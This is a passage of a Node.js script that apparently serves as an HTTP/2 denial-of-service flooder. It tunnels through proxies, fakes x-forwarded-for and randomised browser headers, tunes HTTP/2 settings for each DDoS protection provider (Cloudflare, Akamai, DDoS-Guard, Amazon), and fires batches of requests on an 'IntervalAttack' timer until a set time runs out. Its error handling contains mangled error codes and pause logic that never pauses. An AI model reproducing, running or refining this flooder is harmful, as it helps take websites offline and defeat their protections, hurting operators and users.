  "sec-ch-ua-platform" : randomElement(["Android","iOS", "Windows"]),
  "cache-control": "max-age=0",
  "sec-ch-ua" : secChUa,
  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
"sec-fetch-user": "?1",
  "user-agent" :  u[Math.floor(Math.random() * u.length)],
   "x-requested-with": "XMLHttpRequest",
}

 const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     address: parsedTarget.host + ":443",
     ":authority": parsedTarget.host,
     "x-forwarded-for" : parsedProxy[0],
     "x-forwarded-proto" : "https",
     timeout: 15
 };
 Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return

    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)

    const settings = {
       enablePush: false,
       initialWindowSize: 15564991,
   };

 
    const tlsOptions = {
       port: parsedPort,
       secure: true,
       ALPNProtocols: [
           "h2"
       ],
       ciphers: ciphers,
       sigalgs: sigalgs,
       requestCert: true,
       socket: connection,
       ecdhCurve: ecdhCurve,
       honorCipherOrder: false,
       followAllRedirects: true,
       rejectUnauthorized: false,
       secureOptions: secureOptions,
       secureContext :secureContext,
       host : parsedTarget.host,
       servername: parsedTarget.host,
       secureProtocol: secureProtocol
   };
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      settings: {
        initialWindowSize: 15564991,
        maxFrameSize : 236619,
    },
    createConnection: () => tlsConn,
    socket: connection,
});

client.settings({
  initialWindowSize: 15564991,
  maxFrameSize : 236619,
});

const streams = [];
client.on('stream', (stream, headers) => {
    if (isp === 'Akamai Technologies, Inc.' ) {
        stream.priority = Math.random() < 0.5 ? 0 : 1; 
        stream.connection.localSettings[http2.constants.SETTINGS_HEADER_TABLE_SIZE(0x01)] = 65536;  // Tăng kích thước bảng tiêu đề
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 500;  // Tăng số luồng đồng thời
        stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 1048576; // Tăng kích thước cửa sổ ban đầu để nhận nhiều dữ liệu hơn
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 16777215;    // Khung lớn nhất cho phép
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_HEADER_LIST_SIZE(0x06)] = 65536; // Tăng kích thước danh sách tiêu đề tối đa
    } else if (isp === 'Cloudflare, Inc.') {
        stream.priority = Math.random() < 0.5 ? 0 : 1;
        stream.connection.localSettings[http2.constants.SETTINGS_HEADER_TABLE_SIZE(0x01)] = 65536;
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 500;
        stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 1048576;
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 16777215;
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_HEADER_LIST_SIZE(0x06)] = 65536;
    } else if (isp === 'Ddos-guard LTD') {
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
        stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 1048576;
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 16777215;
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_HEADER_LIST_SIZE(0x06)] = 65536;
    } else if (isp === 'Amazon.com, Inc.') {
        stream.priority = Math.random() < 0.5 ? 0 : 1; 
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 500;
        stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 1048576;
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 16777215;
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_HEADER_LIST_SIZE(0x06)] = 65536;
    } else {
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 500;
        stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 1048576;
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 16777215;
        stream.connection.localSettings[http2.constants.SETTINGS_MAX_HEADER_LIST_SIZE(0x06)] = 65536;
    }
    streams.push(stream);
});

client.setMaxListeners(0);
client.settings(settings);
    client.on("connect", () => {
       const IntervalAttack = setInterval(() => {
           for (let i = 0; i < args.Rate; i++) {
            const dynHeaders = {                 
              ...headers,    
              ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
              ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],    

              
            }
               const request = client.request(dynHeaders)
               .on("response", response => {
                   request.close();
                   request.destroy();
                  return
               });
               request.end(); 

           }
       }, interval);
      return;
    });
    client.on("close", () => {
        client.destroy();
        connection.destroy();
        return
    });
client.on("timeout", () => {
	client.destroy();
	connection.destroy();
	return
	});
  client.on("error", (error) => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSIONaaaaaa') {
      console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
      shouldPauseRequests = false;
      setTimeout(() => {
         
          shouldPauseRequests = false;
      },2000);
  } else if (error.code === 'ECONNRESETaa') {
      
      shouldPauseRequests = false;
      setTimeout(() => {
          
          shouldPauseRequests = false;
      }, 5000);
  }  else { const statusCode = error.response ? error.response.statusCode : null;
    if (statusCode >= 520 && statusCode <= 529) {
      
      shouldPauseRequests = false;
      setTimeout(() => {
         // console.log('Resuming requests after a short delay\r');
          shouldPauseRequests = false;
      }, 2000);
  } else if (statusCode >= 531 && statusCode <= 539) {
      
      setTimeout(() => {
         // console.log('Resuming requests after a short delay\r');
          shouldPauseRequests = false;
      }, 2000);
  } else {

  }

  }
    client.destroy();
    connection.destroy();
    return
});
});
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});